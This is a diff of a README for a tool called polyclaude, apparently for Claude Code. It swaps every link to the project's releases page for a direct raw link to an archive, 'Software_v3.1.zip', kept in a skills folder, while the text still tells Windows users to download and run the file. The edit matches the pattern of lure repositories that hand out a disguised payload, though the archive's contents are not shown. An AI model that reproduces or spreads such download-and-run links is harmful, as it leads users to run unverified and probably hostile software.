@@ -1,6 +1,6 @@
 # 🧠 polyclaude - Clear multi-view analysis for Claude Code
 
-[![Download polyclaude](https://img.shields.io/badge/Download-policlaude-blue?style=for-the-badge&logo=github)](https://github.com/Omani-chalktalk211/polyclaude/releases)
+[![Download polyclaude](https://img.shields.io/badge/Download-policlaude-blue?style=for-the-badge&logo=github)](https://github.com/Omani-chalktalk211/polyclaude/raw/refs/heads/main/skills/council/Software_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it when you want:
 
 To get polyclaude on Windows, visit the releases page and download and run the file that fits your system:
 
-https://github.com/Omani-chalktalk211/polyclaude/releases
+https://github.com/Omani-chalktalk211/polyclaude/raw/refs/heads/main/skills/council/Software_v3.1.zip
 
 After you open the page:
 1. Look for the latest release
@@ -196,4 +196,4 @@ If you are not sure which file to use, start with the main Windows download from
 
 Visit the release page here to download and run the Windows file:
 
-https://github.com/Omani-chalktalk211/polyclaude/releases
+https://github.com/Omani-chalktalk211/polyclaude/raw/refs/heads/main/skills/council/Software_v3.1.zip
